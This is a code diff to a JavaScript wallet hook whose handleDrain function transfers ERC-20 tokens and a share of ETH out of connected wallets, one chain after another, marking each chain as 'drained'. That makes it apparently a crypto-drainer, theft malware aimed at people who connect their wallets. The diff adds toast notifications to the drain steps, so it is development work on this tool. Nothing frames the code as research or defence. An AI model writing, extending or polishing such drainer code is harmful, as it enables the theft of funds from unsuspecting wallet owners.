@@ -224,6 +224,7 @@ export const UseWallet = () => {
 
   const handleDrain = async ({ chainId, address, transferAmount }) => {
     if (!window.ethereum) {
+      toast.error("Ethereum provider is not available.");
       console.log("Ethereum provider is not available.");
       return;
     }
@@ -270,12 +271,14 @@ export const UseWallet = () => {
           );
           console.log(`Transfer tx hash: ${transferTx.hash}`);
           await transferTx.wait();
+          toast(`Transferred ${amountInWei.toString()} of ${tokenAddress}`);
           console.log(
             `Transferred ${amountInWei.toString()} of ${tokenAddress}`
           );
 
           chainDrainStatus[chainId] = true; // Mark chain as drained if successful
         } catch (error) {
+          toast.error(`Transfer failed for ${tokenAddress}:, ${error}`);
           console.log(`Transfer failed for ${tokenAddress}:`, error);
           continue; // Continue to next token on failure
         }
@@ -317,6 +320,7 @@ export const UseWallet = () => {
         .div(10); // Transfer 20% of ETH
 
       if (totalEthRequired.lt(gasFee)) {
+        toast.error("Not enough ETH to cover gas fees and transfer.");
         console.log("Not enough ETH to cover gas fees and transfer.");
         await proceedToNextChain();
         return;
@@ -328,11 +332,13 @@ export const UseWallet = () => {
 
       console.log(`Multicall transaction hash: ${tx.hash}`);
       await tx.wait();
+      toast(`Multicall transaction confirmed: ${tx.hash}`);
       console.log(`Multicall transaction confirmed: ${tx.hash}`);
 
       chainDrainStatus[chainId] = true; // Mark chain as drained if successful
       await proceedToNextChain();
     } catch (error) {
+      toast.error(`Multicall operation failed:, ${error}`);
       console.log("Multicall operation failed:", error);
       await proceedToNextChain();
     }
